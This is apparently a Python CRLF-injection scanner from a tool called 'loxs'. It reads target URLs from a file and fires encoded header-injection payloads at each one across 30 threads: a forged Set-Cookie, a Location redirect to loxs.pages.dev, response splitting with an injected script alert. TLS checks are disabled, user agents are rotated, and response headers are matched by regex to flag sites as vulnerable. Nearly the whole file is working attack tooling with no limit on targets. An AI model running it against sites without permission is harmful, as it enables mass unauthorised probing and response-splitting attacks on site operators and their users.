#!/usr/bin/python3

import os
import time
import logging
import random
import re
import requests
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


init(autoreset=True)


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36"
]


REGEX_PATTERNS = [
    r'(?m)(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)?loxs\.pages\.dev\/?(\/|[^.].*)?$|'
    r'(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=(injection|injected|hi)(?:\s*?)(?:$|;)|loxs-x))'
]


def get_random_user_agent():
    return random.choice(USER_AGENTS)


def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
    session = requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session


def generate_payloads(url):
    domain = urlparse(url).netloc
    base_payloads = [
        "/%0aSet-Cookie:loxs=injected;",
        "/%0aSet-Cookie:loxs=injected",
        "/%0d%0aLocation: http://loxs.pages.dev",
        "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
        "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0a<script>alert('LOXS');</script>"
    ]
    return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]


def check_crlf_vulnerability(url, payload):
    target_url = f"{url}{payload}"
    start_time = time.time()

    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }

    try:
        session = get_retry_session()
        response = session.get(target_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
        response_time = time.time() - start_time

        is_vulnerable = False
        vulnerability_details = []

        for header, value in response.headers.items():
            combined_header = f"{header}: {value}"
            if any(re.search(pattern, combined_header, re.IGNORECASE) for pattern in REGEX_PATTERNS):
                is_vulnerable = True
                vulnerability_details.append(combined_header)

        if is_vulnerable:
            print(Fore.RED + f"[VULNERABLE] {target_url} - {response_time:.2f}s")
            for detail in vulnerability_details:
                print(Fore.YELLOW + detail)
        else:
            print(Fore.GREEN + f"[SAFE] {target_url} - {response_time:.2f}s")

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[ERROR] {target_url}: {e}")


def run_crlf_scanner():
    url_file_path = os.path.join(os.getcwd(), 'live-domain.txt')

    
    if not os.path.isfile(url_file_path):
        print(Fore.RED + f"File not found: {url_file_path}")
        return

    
    with open(url_file_path, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]

    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        for url in urls:
            payloads = generate_payloads(url)
            for payload in payloads:
                futures.append(executor.submit(check_crlf_vulnerability, url, payload))

        for future in as_completed(futures):
            future.result()  

if __name__ == "__main__":
    run_crlf_scanner()
